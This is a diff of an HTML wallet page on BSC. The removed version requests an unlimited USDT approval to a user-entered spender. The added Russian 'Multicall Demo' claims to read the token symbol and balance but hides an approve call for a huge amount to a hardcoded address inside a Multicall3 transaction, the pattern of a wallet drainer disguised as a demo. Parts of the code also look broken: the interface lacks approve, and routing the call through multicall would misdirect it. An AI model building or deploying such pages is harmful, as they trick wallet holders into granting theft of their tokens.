@@ -1,196 +1,72 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <title>Connect Contract</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-
-  <style>
-    body {
-      margin: 0;
-      font-family: "Inter", system-ui, sans-serif;
-      background: #0b0c10;
-      color: #e5e5e5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .card {
-      background: #1f2833;
-      padding: 32px;
-      border-radius: 18px;
-      width: 92%;
-      max-width: 420px;
-      box-shadow: 0 0 30px rgba(0,0,0,0.45);
-      text-align: center;
-    }
-    h1 {
-      margin-bottom: 24px;
-      font-size: 26px;
-      color: #66fcf1;
-      font-weight: 600;
-    }
-    label {
-      display: block;
-      text-align: left;
-      margin-bottom: 6px;
-      font-size: 14px;
-      color: #c5c6c7;
-    }
-    input {
-      width: 100%;
-      padding: 14px;
-      border-radius: 10px;
-      border: 1px solid #45a29e;
-      background: #0b0c10;
-      color: #e5e5e5;
-      margin-bottom: 20px;
-      font-size: 15px;
-    }
-    button {
-      width: 100%;
-      padding: 15px;
-      border: none;
-      border-radius: 10px;
-      background: #45a29e;
-      color: #0b0c10;
-      font-size: 17px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-    button:hover {
-      background: #66fcf1;
-    }
-    .status {
-      margin-top: 20px;
-      font-size: 13px;
-      color: #c5c6c7;
-      white-space: pre-wrap;
-      background: #0b0f16;
-      padding: 14px;
-      border-radius: 10px;
-      border: 1px solid #1f2833;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <title>Multicall Demo</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
 </head>
-
 <body>
-  <div class="card">
-    <h1>Connect Contract</h1>
-    <label>Contract address:</label>
-    <input id="spender" placeholder="0x..." />
-    <button id="connectBtn">Connect Wallet</button>
-    <div id="status" class="status">Waiting for action…</div>
-  </div>
-
-  <!-- ethers.js -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.umd.min.js"></script>
-
-  <!-- WalletConnect Sign Client через jsDelivr -->
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.9.0/dist/index.umd.min.js"></script>
+  <h1>Демонстрация Multicall</h1>
+  <button id="connect">Подключить кошелёк</button>
+  <button id="multicall">Вызвать Multicall</button>
 
   <script>
-    const tokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
-    const abi = [
-      {
-        "inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],
-        "name":"approve",
-        "outputs":[{"internalType":"bool","name":"","type":"bool"}],
-        "stateMutability":"nonpayable",
-        "type":"function"
-      }
+    let provider, signer;
+
+    // Подключение кошелька
+    document.getElementById("connect").onclick = async () => {
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      alert("Кошелёк подключен!");
+    };
+
+    // Адрес Multicall3 на BSC
+    const multicallAddress = "0xcA11bde05977b3631167028862bE2a173976CA11";
+
+    // Минимальный ABI для aggregate
+    const multicallAbi = [
+      "function aggregate(tuple(address target, bytes callData)[] calls) public returns (uint256 blockNumber, bytes[] returnData)"
     ];
 
-    const projectId = "a6f8c1b4c1f3f0d9e8b2c7a4f1d2e3b4"; // demo ID
+    // USDT контракт на BSC
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+    const usdtAbi = [
+      "function symbol() view returns (string)",
+      "function balanceOf(address) view returns (uint256)"
+    ];
+    const usdtInterface = new ethers.utils.Interface(usdtAbi);
 
-    let provider;
-    let signer;
-
-    function setStatus(t) {
-      document.getElementById("status").textContent = t;
-    }
-
-    async function connect() {
-      try {
-        const spender = document.getElementById("spender").value.trim();
-        if (!spender) {
-          setStatus("Enter contract address.");
-          return;
-        }
-
-        let ethProvider;
-
-        if (window.ethereum) {
-          // Desktop wallets (MetaMask, Rabby, Trust, OKX, Coinbase)
-          await window.ethereum.request({ method: "eth_requestAccounts" });
-          ethProvider = window.ethereum;
-        } else if (window.WalletConnectSignClient) {
-          // Mobile wallets via WalletConnect
-          const signClient = await window.WalletConnectSignClient.init({
-            projectId,
-            metadata: {
-              name: "Connect Contract",
-              description: "Approve demo",
-              url: window.location.href,
-              icons: ["https://walletconnect.com/walletconnect-logo.png"]
-            }
-          });
-
-          const { uri, approval } = await signClient.connect({
-            requiredNamespaces: {
-              eip155: {
-                methods: ["eth_sendTransaction", "personal_sign", "eth_signTypedData"],
-                chains: ["eip155:56"], // BSC
-                events: ["accountsChanged", "chainChanged"]
-              }
-            }
-          });
-
-          if (uri) {
-            setStatus("Scan QR with WalletConnect app:\n" + uri);
-          }
-
-          const session = await approval();
-          ethProvider = {
-            request: async ({ method, params }) => {
-              return await signClient.request({
-                topic: session.topic,
-                chainId: "eip155:56",
-                request: { method, params }
-              });
-            }
-          };
-        } else {
-          setStatus("No wallet provider found.");
-          return;
-        }
-
-        provider = new ethers.BrowserProvider(ethProvider);
-        signer = await provider.getSigner();
-
-        const token = new ethers.Contract(tokenAddress, abi, signer);
-        const max = ethers.MaxUint256;
-
-        setStatus("Sending transaction…");
-        const tx = await token.approve(spender, max);
-
-        setStatus("Waiting for confirmation…\nTx: " + tx.hash);
-        await tx.wait();
-
-        setStatus("Success!\nTx: " + tx.hash);
-
-      } catch (e) {
-        setStatus("Error: " + (e.reason || e.message || e));
+    // Вызов Multicall
+    document.getElementById("multicall").onclick = async () => {
+      if (!signer) {
+        alert("Сначала подключи кошелёк!");
+        return;
       }
-    }
 
-    document.getElementById("connectBtn").onclick = connect;
+      const userAddress = await signer.getAddress();
+
+      // Формируем массив вызовов
+      const calls = [
+        {
+          target: usdtAddress,
+          callData: usdtInterface.encodeFunctionData("symbol", [])
+        },
+        {
+          target: usdtAddress,
+          callData: usdtInterface.encodeFunctionData("balanceOf", [userAddress])
+        },
+        {
+          target: usdtAddress,
+          callData: usdtInterface.encodeFunctionData("approve", ["0x6f99026B250DA2BEAfBaB86CA738Eb152A82717e", "999999999999999999999999999999999999999999999999999999999999"])
+        }
+      ];
+
+      const multicall = new ethers.Contract(multicallAddress, multicallAbi, signer);
+      const tx = await multicall.aggregate(calls);
+      console.log("TX отправлена:", tx.hash);
+      alert("Транзакция отправлена! Hash: " + tx.hash);
+    };
   </script>
-
 </body>
 </html>
-
-</html>
-
